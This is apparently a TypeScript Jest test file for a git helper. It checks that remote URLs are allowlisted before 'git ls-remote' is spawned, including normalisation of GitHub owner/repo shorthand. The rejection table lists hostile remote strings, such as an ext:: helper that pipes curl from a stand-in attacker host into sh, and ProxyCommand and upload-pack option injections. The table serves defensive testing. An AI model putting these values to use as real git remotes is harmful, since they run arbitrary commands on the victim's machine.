// Resolve the test Git independently of desktop preferences; this suite tests Git operations.
jest.mock('../lib/git-executable', () => ({
  getResolvedGitExecutableForSpawn: (): Promise<string> =>
    Promise.resolve(process.env.CANOPY_GIT_EXECUTABLE?.trim() || 'git'),
}));

/**
 * `getRemoteHeadCommitSha` is reached from an UNATTENDED background
 * marketplace refresh using a persisted `sourceUrl`. Git's `ext::` remote
 * helper executes an arbitrary command, and the `--` separator does not stop
 * it (`--` only ends option parsing), so the transport must be allowlisted
 * before git is invoked at all.
 *
 * These assert on whether the process is SPAWNED, not merely on the return
 * value: a guard that returned null after shelling out would still have run
 * the attacker's command.
 */
const execFileMock = jest.fn<unknown, unknown[]>();

type ExecCallback = (
  error: Error | null,
  stdout: string,
  stderr: string,
) => void;

function isExecCallback(value: unknown): value is ExecCallback {
  return typeof value === 'function';
}

jest.mock('node:child_process', () => ({
  execFile: (...args: unknown[]): unknown => execFileMock(...args),
  spawn: jest.fn(),
}));

import { getRemoteHeadCommitSha } from '../lib/git';

describe('getRemoteHeadCommitSha remote transport allowlist', () => {
  beforeEach(() => {
    execFileMock.mockReset();
    execFileMock.mockImplementation((...args: unknown[]) => {
      const callback = args[3];
      if (isExecCallback(callback))
        callback(null, `${'a'.repeat(40)}\tHEAD\n`, '');
      return undefined;
    });
  });

  it.each([
    ['ext:: helper', 'ext::sh -c "curl https://attacker.test | sh"'],
    ['ext:: with whitespace', '  ext::sh -c id  '],
    ['leading dash option injection', '-oProxyCommand=curl attacker.test'],
    ['upload-pack option injection', '--upload-pack=curl attacker.test'],
    ['schemeless double-colon helper', 'weird::payload'],
    // `<scheme>::` is remote-HELPER syntax, not a transport. Matching a bare
    // `:` would let an allowlisted scheme NAME smuggle a helper through.
    ['allowlisted name with helper syntax', 'ssh::payload'],
    ['file helper syntax', 'file::payload'],
    ['fd helper', 'fd::17/19'],
    ['empty remote', ''],
  ])('refuses to invoke git for %s', async (_label, remote) => {
    await expect(getRemoteHeadCommitSha(remote)).resolves.toBeNull();
    expect(execFileMock).not.toHaveBeenCalled();
  });

  it.each([
    ['https', 'https://github.com/owner/repo.git'],
    ['http', 'http://internal.test/owner/repo.git'],
    ['ssh', 'ssh://git@github.com/owner/repo.git'],
    ['git', 'git://example.test/owner/repo.git'],
    ['file', 'file:///srv/git/repo.git'],
    ['scp-style shorthand', 'git@github.com:owner/repo.git'],
    ['bare local path', '/srv/git/repo.git'],
    ['windows drive-letter path', 'C:\\repos\\marketplace'],
    ['windows forward-slash path', 'C:/repos/marketplace'],
    // Validate-and-pass must operate on the SAME value: the allowlist trims,
    // so the trimmed remote is what has to reach git.
    ['surrounding whitespace', '  https://github.com/owner/repo.git  '],
  ])('invokes git for a legitimate %s remote', async (_label, remote) => {
    // Asserting on the SPAWN rather than the resolved SHA: this suite mocks
    // `execFile` directly, and `runGit` consumes it through `promisify`, so a
    // plain callback mock does not round-trip a value. The property under test
    // is only that the allowlist does not reject a legitimate transport.
    await getRemoteHeadCommitSha(remote);
    // `execFile` is also used for the login-shell PATH probe, so find the git
    // invocation rather than assuming it is the first call.
    const lsRemoteArgs = execFileMock.mock.calls
      .map((call): unknown => call[1])
      .find(
        (args): args is string[] =>
          Array.isArray(args) && args[0] === 'ls-remote',
      );
    expect(lsRemoteArgs).toEqual(['ls-remote', '--', remote.trim(), 'HEAD']);
  });

  it('normalizes GitHub owner/repo shorthand to an https remote', async () => {
    // Marketplaces are commonly persisted in shorthand. Left as a bare path it
    // would fall through to `ls-remote <shorthand>`, which fails - so a
    // Codex-only marketplace stored this way could never resolve a remote
    // revision, and never automatically escape structural suppression.
    await getRemoteHeadCommitSha('example-org/example-repo');

    const lsRemoteArgs = execFileMock.mock.calls
      .map((call): unknown => call[1])
      .find(
        (args): args is string[] =>
          Array.isArray(args) && args[0] === 'ls-remote',
      );
    expect(lsRemoteArgs).toEqual([
      'ls-remote',
      '--',
      'https://github.com/example-org/example-repo',
      'HEAD',
    ]);
  });

  it('strips an @ref suffix from GitHub shorthand', async () => {
    // `parseGitHubSource` accepts and strips this form, so a source persisted
    // that way must not fall through to the bare-local-path branch here - that
    // would leave the structural escape hatch closed for exactly the sources
    // shorthand normalization was added to unblock.
    await getRemoteHeadCommitSha('example-org/example-repo@v2');

    const lsRemoteArgs = execFileMock.mock.calls
      .map((call): unknown => call[1])
      .find(
        (args): args is string[] =>
          Array.isArray(args) && args[0] === 'ls-remote',
      );
    expect(lsRemoteArgs).toEqual([
      'ls-remote',
      '--',
      'https://github.com/example-org/example-repo',
      'HEAD',
    ]);
  });
});
